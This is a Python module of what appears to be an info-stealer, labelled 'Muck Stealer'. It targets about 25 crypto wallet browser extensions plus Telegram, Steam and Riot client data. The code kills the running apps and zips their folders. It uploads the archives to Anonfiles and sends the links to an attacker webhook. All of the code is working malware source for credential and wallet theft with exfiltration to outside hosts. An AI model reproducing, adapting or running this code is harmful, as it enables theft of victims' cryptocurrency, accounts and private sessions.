import os
import subprocess
import threading
import time
import json
from stealer.core import zipfolder, uploadToAnonfiles, LoadUrlib
from core.config import WEBHOOK_URL

WalletsZip = []
GamingZip = []
OtherZip = []
wallts = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"],
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"]
]

def ZipTelegram(path, arg, procc):
    if not os.path.exists(path):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    zipfolder(arg, path)
    for _ in range(3):
        lnik = uploadToAnonfiles(f'{os.getenv("TEMP")}/{arg}.zip')
        if lnik and "https://" in str(lnik):
            break
        time.sleep(4)
    try:
        os.remove(f"{os.getenv('TEMP')}/{arg}.zip")
    except:
        pass
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc, local, roaming):
    global WalletsZip, GamingZip, OtherZip
    pathC = path
    name = arg
    for walletids in wallts:
        if str(walletids[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{walletids[1]}_{browser}"
            pathC = path + arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = browser
    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
            return
        with open(f"{pathC}/loginusers.vdf", "r", encoding="utf8") as f:
            if not any('RememberPassword"\t\t"1"' in l for l in f.readlines()):
                return
        name = arg
    zipfolder(name, pathC)
    for _ in range(3):
        lnik = uploadToAnonfiles(f'{os.getenv("TEMP")}/{name}.zip')
        if lnik and "https://" in str(lnik):
            break
        time.sleep(4)
    try:
        os.remove(f"{os.getenv('TEMP')}/{name}.zip")
    except:
        pass
    if "/Local Extension Settings/" in arg or "/HougaBouga/" in arg or "wallet" in arg.lower():
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])

def GatherZips(paths1, paths2, paths3, local, roaming, GLINFO):
    global WalletsZip, GamingZip, OtherZip
    threads = []
    for walletids in wallts:
        for patt in paths1:
            t = threading.Thread(target=ZipThings, args=(patt[0], patt[5]+str(walletids[0]), patt[1], local, roaming))
            t.start()
            threads.append(t)
    for patt in paths2:
        t = threading.Thread(target=ZipThings, args=(patt[0], patt[2], patt[1], local, roaming))
        t.start()
        threads.append(t)
    t = threading.Thread(target=ZipTelegram, args=(paths3[0], paths3[2], paths3[1]))
    t.start()
    threads.append(t)
    for t in threads:
        t.join()
    wal = "\n".join([f"└─ [{i[0]}]({i[1]})" for i in WalletsZip]) if WalletsZip else ""
    ga = "\n".join([f"└─ [{i[0]}]({i[1]})" for i in GamingZip]) if GamingZip else ""
    ot = "\n".join([f"└─ [{i[0]}]({i[1]})" for i in OtherZip]) if OtherZip else ""
    data = {
        "content": GLINFO,
        "embeds": [{"title": "App Stealer", "description": f"**Wallets**\n{wal}\n\n**Gaming**\n{ga}\n\n**Apps**\n{ot}", "footer": {"text": "Muck Stealer"}}]
    }
    LoadUrlib(WEBHOOK_URL, data=json.dumps(data).encode(), headers={"Content-Type": "application/json"})